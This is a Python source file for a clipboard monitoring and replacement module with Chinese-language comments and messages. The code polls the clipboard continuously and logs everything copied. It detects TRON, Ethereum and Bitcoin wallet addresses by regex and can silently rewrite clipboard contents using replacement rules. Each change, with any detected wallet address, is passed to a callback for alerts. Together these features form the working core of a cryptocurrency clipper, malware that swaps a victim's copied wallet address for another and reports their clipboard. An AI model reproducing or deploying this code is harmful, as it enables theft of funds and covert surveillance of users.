#!/usr/bin/env python3
"""剪切板监控替换 (Termux兼容版)"""
import os
import re
import threading
import time
from typing import Optional, Callable
from dataclasses import dataclass
from datetime import datetime

@dataclass
class ClipboardEntry:
    timestamp: str
    content: str
    content_type: str

class ClipboardMonitor:
    """剪切板监控替换 - Termux 降级版"""

    def __init__(self):
        self.monitoring = False
        self.history = []
        self.last_content = ""
        self.callback = None
        self._thread = None
        self.replace_rules = {}
        self.is_termux = os.path.exists("/data/data/com.termux")

    def get_clipboard(self) -> str:
        """获取当前剪切板内容"""
        if self.is_termux:
            return "⚠️ Termux 不支持剪切板访问 (需要 GUI)"
        try:
            import pyperclip
            content = pyperclip.paste()
            if not content:
                return "📋 剪切板为空"
            return f"📋 **当前剪切板**\n━━━━━━━━━━━━━━━━━━━━━\n```\n{content[:2000]}\n```"
        except Exception as e:
            return f"❌ 错误: `{str(e)}`"

    def set_clipboard(self, text: str) -> str:
        if self.is_termux:
            return "⚠️ Termux 不支持剪切板操作"
        try:
            import pyperclip
            pyperclip.copy(text)
            return f"✅ 已设置剪切板"
        except Exception as e:
            return f"❌ 错误: `{str(e)}`"

    def add_replace_rule(self, pattern: str, replacement: str):
        self.replace_rules[pattern] = replacement

    def start_monitor(self, callback=None, auto_replace: bool = False) -> str:
        if self.is_termux:
            return "⚠️ Termux 不支持剪切板监控"

        if self.monitoring:
            return "📋 剪切板监控已在运行"

        self.monitoring = True
        self.callback = callback

        def monitor_loop():
            while self.monitoring:
                try:
                    import pyperclip
                    current = pyperclip.paste()

                    if current and current != self.last_content:
                        self.last_content = current
                        wallet_info = self._detect_wallet(current)

                        modified = current
                        if auto_replace and self.replace_rules:
                            for pattern, replacement in self.replace_rules.items():
                                modified = modified.replace(pattern, replacement)
                            if modified != current:
                                pyperclip.copy(modified)

                        entry = ClipboardEntry(
                            timestamp=datetime.now().strftime("%H:%M:%S"),
                            content=current[:500],
                            content_type="text"
                        )
                        self.history.append(entry)

                        if self.callback:
                            alert = f"📋 **剪切板更新**\n`{entry.timestamp}`\n```\n{current[:500]}\n```"
                            if wallet_info:
                                alert += f"\n\n⚠️ **检测到钱包地址**: `{wallet_info}`"
                            self.callback(alert)

                except Exception as e:
                    print(f"Clipboard monitor error: {e}")
                time.sleep(0.5)

        self._thread = threading.Thread(target=monitor_loop, daemon=True)
        self._thread.start()
        return "📋 剪切板监控已启动"

    def stop_monitor(self) -> str:
        self.monitoring = False
        return "🛑 剪切板监控已停止"

    def get_history(self, count: int = 20) -> str:
        recent = self.history[-count:] if self.history else []
        if not recent:
            return "暂无记录"
        lines = []
        for entry in recent:
            lines.append(f"`[{entry.timestamp}]` `{entry.content[:80]}{'...' if len(entry.content) > 80 else ''}`")
        return "📋 **剪切板历史**\n━━━━━━━━━━━━━━━━━━━━━\n" + "\n".join(lines)

    def _detect_wallet(self, text: str) -> Optional[str]:
        tron_pattern = r'T[1-9A-HJ-NP-Za-km-z]{33}'
        eth_pattern = r'0x[a-fA-F0-9]{40}'
        btc_pattern = r'[13][a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-z0-9]{39,59}'

        for pattern, name in [(tron_pattern, "TRON"), (eth_pattern, "ETH/BSC"), (btc_pattern, "BTC")]:
            match = re.search(pattern, text)
            if match:
                return f"{name}: `{match.group()}`"
        return None

    def clear_history(self) -> str:
        self.history.clear()
        return "🗑️ 剪切板历史已清空"
